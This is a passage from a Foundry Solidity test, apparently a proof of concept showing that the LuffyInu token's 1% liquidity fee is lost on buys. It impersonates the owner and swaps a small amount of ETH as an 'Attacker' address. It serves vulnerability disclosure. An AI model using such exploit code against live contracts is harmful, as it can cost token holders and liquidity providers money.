        vm.label(pair, "Uniswap Pair");
        vm.label(attacker, "Attacker");

        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Enable taxes as owner
        address owner = luffy.owner();
        vm.startPrank(owner);
        luffy.setTax(true);
        luffy.addExcludeFee(attacker, false);
        vm.stopPrank();

        // Verify attacker is not excluded
        require(!luffy.excludeFee(attacker), "Attacker should not be excluded");

        // Build swap path: WETH -> LuffyInu
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Swap a SMALL amount of ETH for tokens (this triggers the buy with fees)
        // Using small amount to avoid draining pair liquidity
        uint256 swapAmount = 0.01 ether;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: swapAmount
        }(0, path, attacker, block.timestamp + 1 hours);

        // The liquidity fee (1%) was lost during the buy - this demonstrates the vulnerability
        // Tokens that should have been added to pair liquidity are instead lost
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

